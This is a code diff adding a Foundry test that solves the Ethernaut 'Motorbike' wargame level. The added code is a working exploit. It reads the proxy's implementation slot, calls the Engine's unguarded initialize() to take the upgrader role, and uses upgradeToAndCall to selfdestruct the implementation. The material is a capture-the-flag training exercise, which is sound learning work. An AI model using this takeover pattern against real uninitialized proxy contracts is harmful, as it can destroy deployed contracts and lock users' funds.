@@ -5,6 +5,25 @@ import "forge-std/Test.sol";
 import "forge-std/console2.sol";
 import "../src/Ethernaut.sol";
 import "../src/metrics/Statistics.sol";
+import "openzeppelin-contracts/utils/Address.sol";
+
+interface IEngine {
+    function horsePower() external view returns (uint256);
+
+    function initialize() external;
+
+    function upgradeToAndCall(address newImplementation, bytes memory data)
+        external
+        payable;
+
+    function upgrader() external view returns (address);
+}
+
+contract SelfDestructor {
+    function selfDestruct() public {
+        selfdestruct(payable(msg.sender));
+    }
+}
 
 contract MotorbikeTest is Test {
     using stdStorage for StdStorage;
@@ -71,6 +90,42 @@ contract MotorbikeTest is Test {
         emit log_named_address("instanceAddress", instanceAddress);
 
         /* Level Hack */
+        // 0. Get Engine address
+        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+        // Read implementation storage slot and convert 32 bytes result into address
+        address engineAddress = address(
+            uint160(uint256(vm.load(instanceAddress, _IMPLEMENTATION_SLOT)))
+        );
+        IEngine engine = IEngine(engineAddress);
+
+        // 1. Call initialize directly on Engine
+        address upgrader = engine.upgrader();
+        emit log_named_address("upgrader", upgrader);
+        assertEq(upgrader, address(0));
+
+        engine.initialize();
+
+        upgrader = engine.upgrader();
+        emit log_named_address("upgrader", upgrader);
+        assertEq(upgrader, address(eoa));
+
+        // 2. Deploy a contract with selfdestruct()
+        SelfDestructor selfDestructor = new SelfDestructor();
+
+        // 3. Call upgradeToAndCall() directly on Engine to set to above contract and also call selfdestruct()
+        engine.upgradeToAndCall(
+            address(selfDestructor),
+            abi.encodeWithSignature("selfDestruct()")
+        );
+
+        // selfdestruct() has no effect in Foundry tests
+        // Since its all a big single txn, and the effects of selfdestruct only happens at the end of the txn
+        // Hence manually etching the code to empty
+        vm.etch(engineAddress, "");
+
+        bool destroyed = !Address.isContract(engineAddress);
+        console.log("destroyed", destroyed);
+        assertTrue(destroyed);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
